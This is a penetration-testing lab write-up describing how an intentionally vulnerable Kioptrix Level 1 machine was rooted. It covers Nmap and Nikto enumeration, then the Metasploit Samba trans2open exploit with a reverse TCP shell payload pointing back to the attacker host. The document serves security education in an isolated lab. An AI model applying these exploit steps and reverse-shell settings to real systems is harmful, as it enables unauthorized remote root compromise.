# Kioptrix Level 1 — Samba trans2open Root Access

## Overview

This write-up documents my exploitation of **Kioptrix Level 1**, an intentionally vulnerable Linux virtual machine used for penetration-testing practice.

The goal was to perform reconnaissance, identify vulnerable services, determine a viable attack path, exploit the vulnerable Samba service, and obtain **root access**.

### Lab Information

| Item          | Details             |
| ------------- | ------------------- |
| Target        | Kioptrix Level 1    |
| Target IP     | `[TARGET_IP]`       |
| Kali Linux IP | `[KALI_IP]`         |
| Network       | VMware isolated lab |
| Main Target   | Samba               |
| Vulnerability | `trans2open`        |
| Final Access  | `root`              |

---

## 1. Reconnaissance

The first step was to identify the target and determine which services were exposed.

The target machine was:

```text
[TARGET_IP]
```

After confirming that the machine was reachable, I moved on to full port enumeration.

---

## 2. Full Port Scan

I started with an Nmap scan covering all TCP ports and enabling service-version detection:

```bash
nmap -sV -p- [TARGET_IP]
```

### Results

```text
PORT     STATE SERVICE     VERSION

22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20
111/tcp  open  rpcbind     2
139/tcp  open  netbios-ssn Samba smbd
443/tcp  open  ssl/https   Apache/1.3.20
1024/tcp open  status      1 (RPC #100024)
```

### Initial Observations

Several services were running extremely old versions:

* OpenSSH 2.9p2
* Apache 1.3.20
* OpenSSL 0.9.6b
* mod_ssl 2.8.4
* Samba

At this point, there were multiple potential attack surfaces, so I continued with more detailed enumeration instead of immediately attempting exploitation.

---

## 3. Detailed Nmap Enumeration

Next, I ran Nmap with default scripts, service detection, and OS detection:

```bash
nmap -sV -sC -O -p- [TARGET_IP]
```

Some of the important findings were:

### SSH — Port 22

```text
OpenSSH 2.9p2
```

Nmap also reported:

```text
Server supports SSHv1
```

This indicated a very old SSH implementation.

### HTTP — Port 80

```text
Apache httpd 1.3.20
```

The web server identified itself as:

```text
Apache/1.3.20 (Unix) (Red-Hat/Linux)
```

### SMB — Port 139

```text
Samba smbd
```

The NetBIOS information also identified the machine as:

```text
NetBIOS name: KIOPTRIX
Workgroup: MYGROUP
```

The Samba service became particularly interesting because it was exposed remotely and was running on an old Linux system.

### HTTPS — Port 443

The HTTPS service was also running:

```text
Apache/1.3.20
mod_ssl/2.8.4
OpenSSL/0.9.6b
```

Nmap reported that **SSLv2 was supported**, further confirming that this was a legacy system.

---

## 4. Web Enumeration

Since HTTP and HTTPS were available, I performed additional web enumeration using Nikto.

```bash
nikto -h http://[TARGET_IP]
```

Nikto identified:

```text
Apache/1.3.20
mod_ssl/2.8.4
OpenSSL/0.9.6b
```

It also reported several additional issues, including:

* HTTP TRACE enabled
* Directory indexing
* `/manual/` accessible
* `/icons/` directory indexing
* `/usage/` potentially present
* Multiple outdated components

Some of the most interesting findings were:

```text
Apache/1.3.20 appears to be outdated
mod_ssl/2.8.4 appears to be outdated
OpenSSL/0.9.6b appears to be outdated
```

Although the web server contained several vulnerabilities and weaknesses, I continued investigating the exposed Samba service because it offered a potentially more direct route to remote code execution.

---

## 5. Investigating Samba

Nmap had identified Samba on:

```text
139/tcp
```

The next step was determining the Samba version.

I opened Metasploit:

```bash
msfconsole
```

Then used the SMB version scanner:

```text
use auxiliary/scanner/smb/smb_version
```

I configured the target:

```text
set RHOSTS [TARGET_IP]
```

Then ran the scanner:

```text
run
```

The result identified the target as running an old **Samba 2.2.x** installation.

This was a significant finding.

---

## 6. Identifying the Attack Path

At this point, the reconnaissance had established:

```text
Port 139
    ↓
Samba
    ↓
Samba 2.2.x
    ↓
Known vulnerable legacy Samba version
```

One of the well-known vulnerabilities affecting this family of Samba releases is **`trans2open`**.

The vulnerability involves improper handling of SMB transaction requests, resulting in memory corruption that can potentially be leveraged for remote code execution.

Because the target was an intentionally vulnerable Kioptrix machine, this provided a suitable exploitation path.

---

## 7. Selecting the Metasploit Exploit

I returned to Metasploit and selected the Samba `trans2open` exploit:

```text
use exploit/linux/samba/trans2open
```

I configured the target IP:

```text
set RHOSTS [TARGET_IP]
```

For the reverse shell, I selected:

```text
set PAYLOAD linux/x86/shell_reverse_tcp
```

The listener needed to point back to my Kali machine.

My Kali IP was:

```text
[KALI_IP]
```

So I configured:

```text
set LHOST [KALI_IP]
```

The resulting configuration was:

```text
RHOSTS = [TARGET_IP]
LHOST  = [KALI_IP]
PAYLOAD = linux/x86/shell_reverse_tcp
```

---

## 8. Exploitation

With the target and payload configured, I launched the exploit:

```text
exploit
```

Metasploit started the reverse TCP handler and attempted to exploit the vulnerable Samba service.

The exploit successfully resulted in a shell session being created on the target.

This confirmed that the Samba vulnerability was exploitable in the lab environment.

---

## 9. Interacting with the Shell

After the exploit created a session, I checked the available sessions:

```text
sessions
```

I then interacted with the appropriate session:

```text
sessions -i <SESSION_ID>
```

Once inside the shell, I verified the current user.

---

## 10. Verifying Root Access

The first privilege verification command was:

```bash
whoami
```

The result was:

```text
root
```

This confirmed that the exploitation had not merely provided low-privileged access.

The compromised shell was running with **root privileges**.

Additional verification could be performed with:

```bash
id
```

which should show UID `0` for root.

---

## 11. Final Attack Chain

The complete attack path was:

```text
Target Discovery
      ↓
  [TARGET_IP]
      ↓
Full Nmap Scan
      ↓
Port 139 discovered
      ↓
Samba enumeration
      ↓
Samba 2.2.x identified
      ↓
trans2open identified as attack path
      ↓
Metasploit
      ↓
Samba trans2open exploit
      ↓
Reverse TCP shell
      ↓
whoami
      ↓
root
```

---

## 12. Reconnaissance Summary

The reconnaissance phase produced several interesting findings:

| Port | Service | Finding              |
| ---- | ------- | -------------------- |
| 22   | SSH     | OpenSSH 2.9p2, SSHv1 |
| 80   | HTTP    | Apache 1.3.20        |
| 111  | RPC     | rpcbind              |
| 139  | SMB     | Samba 2.2.x          |
| 443  | HTTPS   | Apache 1.3.20, SSLv2 |
| 1024 | RPC     | status service       |

The Samba service ultimately provided the most direct route to compromise.

---

## 13. Why the Exploit Worked

The target was running a legacy Samba version affected by the `trans2open` vulnerability.

The vulnerability allows specially crafted SMB requests to trigger memory corruption.

In this lab, Metasploit automated the exploitation process and delivered a reverse-shell payload.

The successful result was:

```text
Samba vulnerability
        ↓
Remote code execution
        ↓
Reverse shell
        ↓
root privileges
```

---

## 14. Key Takeaways

### 1. Enumeration is Important

The exploit was not selected randomly. It was chosen after identifying the exposed Samba service and determining its version.

### 2. Version Information Matters

The combination of:

```text
Samba
+
Old version
+
Exposed remotely
```

provided an important clue for the attack path.

### 3. Multiple Services Should Be Investigated

The target also exposed SSH, HTTP, HTTPS, and RPC services. Even though they were not used for the final compromise, enumerating them helped build an understanding of the target.

### 4. Always Verify Privileges

Obtaining a shell does not automatically mean the machine has been fully compromised.

The final verification:

```bash
whoami
```

returned:

```text
root
```

confirming successful root access.

---

## 15. Tools Used

* **Nmap** — Port and service enumeration
* **Nikto** — Web server enumeration
* **Metasploit Framework** — Samba version detection and exploitation
* **Kali Linux** — Attacking machine
* **VMware** — Virtual lab environment

---

## 16. Conclusion

Kioptrix Level 1 was successfully compromised through its vulnerable Samba service.

The assessment followed a straightforward penetration-testing methodology:

```text
Reconnaissance
      ↓
Enumeration
      ↓
Service Identification
      ↓
Vulnerability Identification
      ↓
Exploitation
      ↓
Shell Access
      ↓
Privilege Verification
```

The final result was **remote root access** through the Samba `trans2open` vulnerability.

This lab demonstrated the importance of proper reconnaissance and service enumeration before attempting exploitation.

---

## Disclaimer

This write-up was performed against **Kioptrix Level 1**, an intentionally vulnerable machine designed for cybersecurity education.

All exploitation was conducted within an authorized, isolated laboratory environment.
